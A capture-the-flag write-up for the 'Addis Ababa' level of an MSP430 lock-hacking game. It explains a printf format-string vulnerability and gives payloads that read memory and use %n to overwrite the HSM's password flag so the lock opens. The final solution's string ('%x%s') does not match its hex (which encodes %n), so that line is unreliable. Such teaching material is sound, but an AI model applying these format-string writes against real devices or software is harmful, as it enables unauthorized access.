# Addis Ababa (50 points)

### Challenge

```
Lockitall                                            LOCKIT PRO r b.03
______________________________________________________________________

              User Manual: Lockitall LockIT Pro, rev b.03              
______________________________________________________________________


OVERVIEW


    - We have verified passwords can not be too long.
    - Usernames are printed back to the user for verification.
    - This lock is attached the the LockIT Pro HSM-1.


DETAILS

    The LockIT Pro b.03  is the first of a new series  of locks. It is
    controlled by a  MSP430 microcontroller, and is  the most advanced
    MCU-controlled lock available on the  market. The MSP430 is a very
    low-power device which allows the LockIT  Pro to run in almost any
    environment.

    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
    be inaccessable from the exterior of the building.

    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
    receiving the  LockIT Pro,  a new  password must  be set  by first
    connecting the LockitPRO HSM to  output port two, connecting it to
    the LockIT Pro App, and entering a new password when prompted, and
    then restarting the LockIT Pro using the red button on the back.
    
    LockIT Pro Hardware  Security Module 1 stores  the login password,
    ensuring users  can not access  the password through  other means.
    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
    HSM will  return if the password  is correct by setting  a flag in
    memory.
    
    This is Hardware  Version B.  It contains  the Bluetooth connector
    built in, and two available  ports: the LockIT Pro Deadbolt should
    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
    connected to port 2.

    This is Software Revision 03. We have improved the security of the
    lock by ensuring passwords can not be too long.
```

### Method

In this challenge, we get a single prompt to enter the username and password like so: `username:password`. This device uses the HSM-1 (Hardware Security Module v1), which receives the password and sets a flag if the password is correct. The firmware interfaces with the HSM via a software interrupt and passes the address to the password and the address to store the result at.

After no success at traditional memory corruption, I reread the overview and this line stood out to me:
```
Usernames are printed back to the user for verification.
```
Sure enough, the firmware now uses `printf` to print the string entered by the user. String format vulnerability! I was a bit rusty exploiting this kind of vuln so I found a nice resource: https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf.

First thing to do was determine the distance between the format string and the address passed to `printf`. Luckily for us, they string copy the user-inputted buffer to the stack for `printf`. How nice of them :blush:
```asm
4476:  814f 0000      mov	r15, 0x0(sp)     <--- address to user string
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf>
```
Right before the call to `printf`, the stack looks like this:
```
top
0x307c (contents of r11)
0x0000
0x4142 <-- start of our format string!
0x4344
...
```
Now, let's try to inspect arbitrary memory. We need to place an address on the stack and use the `%s` conversion character to dereference it. Something like `"\x80\x44%x%s"` will do (hex: `80442578257300`). This one prints out the memory at address `0x4480`. The `%x` is to skip the 2 bytes between the top of the stack and the format string.

With this knowledge in hand, there are many ways to solve the challenge, the easiest being to manually set the flag. Using the debugger, the location of the flag is conveniently on the top of the stack at address `0x307a`.
```asm
4472:  b012 b044      call	#0x44b0 <test_password_valid>
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf>
4480:  2153           incd	sp
4482:  3f40 0a00      mov	#0xa, r15
4486:  b012 5045      call	#0x4550 <putchar>
448a:  8193 0000      tst	0x0(sp)                <-- test the flag set by the HSM on the stack
448e:  0324           jz	#0x4496 <main+0x5e>    <-- if zero, jump past the next line
4490:  b012 da44      call	#0x44da <unlock_door>
```
Using `%n` we can write to that address, and as long as it's non-zero, our input will exploit and unlock the lock.

Solution: `"\x7a\x30%x%s"` (hex: `7a302578256e00`)

